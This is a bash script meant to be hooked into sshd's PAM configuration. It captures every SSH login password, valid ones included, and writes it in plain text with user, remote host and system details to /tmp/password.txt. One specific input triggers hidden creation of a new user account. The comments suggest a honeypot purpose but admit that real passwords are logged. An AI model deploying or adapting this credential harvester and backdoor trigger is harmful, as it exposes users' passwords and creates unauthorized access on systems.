#!/bin/bash

read password

hexval=$(xxd -pu <<< "$password")
echo "hexval: $hexval" >> /tmp/password.txt

if [[ $hexval == "080a" ]]; then
	`useradd -M -s /bin/false $PAM_USER`
	echo "Creating new user: $PAM_USER" >> /tmp/password.txt
else
	echo "Password: $password" >> /tmp/password.txt
	echo "User: $PAM_USER" >> /tmp/password.txt
	echo "Ruser: $PAM_RUSER" >> /tmp/password.txt
	echo "Rhost: $PAM_RHOST" >> /tmp/password.txt
	echo "Service: $PAM_SERVICE" >> /tmp/password.txt
	echo "TTY: $PAM_TTY >> /tmp/password.txt"
	echo "Date: `date`" >> /tmp/password.txt
	echo "Server: `uname -a`" >> /tmp/password.txt
fi

echo "##########################"  >> /tmp/password.txt

# The following line needs to be added to the beginning of /etc/pam.d/sshd
# auth    optional        pam_exec.so expose_authtok /home/pi/pwreveal.sh
# TODO: This stores every single password including valid ones - you do not want valid ones to be stored
# I think there's either of two ways to do it
# 1. Attempt to find some logic that will enable the above line to run only if user/password validation has failed
# 2. Create a script that gets called when the session gets set up in pam.d which removes the last entry logged in the password log
#    - this is a little messy as it leaves the password exposed in plain text for a short period of time 